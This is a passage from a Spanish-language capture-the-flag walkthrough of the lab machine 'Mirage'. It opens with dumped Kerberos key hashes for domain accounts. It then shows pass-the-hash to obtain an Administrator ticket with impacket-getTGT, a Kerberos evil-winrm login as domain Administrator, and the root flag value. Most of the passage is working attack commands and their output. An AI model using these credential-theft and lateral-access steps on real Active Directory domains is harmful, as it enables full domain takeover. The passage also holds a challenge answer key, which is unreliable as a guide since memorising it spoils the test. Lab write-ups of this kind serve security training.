mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:212405a54d9f02b55ee2eec87c9fa1c62a707239855fba22d0489f3b19e48ed4
Mirage-Service$:aes128-cts-hmac-sha1-96:39733b85fc468a449808c9d2093f2319
Mirage-Service$:des-cbc-md5:c42ffd455b91f208
[*] Cleaning up...
```

Veremos que ha funcionado, por lo que podemos obtener el `hash NTLM` del usuario `administrador` para realizar un `Pass-The-Hash` con dicho usuario y conectarnos por `WinRM`, pero no funcionara por que dara un error, vamos a obtener un `TGT` del usuario `administrador` mejor.

### evil-winrm Administrator (Domain)

```shell
ntpdate mirage.htb ; impacket-getTGT mirage.htb/Administrator -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3
```

Info:

```
2025-10-28 10:11:12.571056 (-0700) +54.787626 +/- 0.014636 mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 54.787626
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

Vemos que ha funcionado, por lo que vamos a exportarlo en nuestra variable de `kerberos`.

```shell
export KRB5CCNAME=Administrator.ccache
```

Ahora vamos a conectarnos por `WinRM` por la autenticacion de `kerberos` de esta forma:

```shell
evil-winrm -i dc01.mirage.htb -k -u Administrator -r mirage.htb
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: Useless cert/s provided, SSL is not enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
mirage\administrator
```

Veremos que ha funcionado, por lo que vamos a leer la `flag` del `admin`.

> root.txt

```
fa4bbe8292f6fb4161285afe9a76a2d4
```
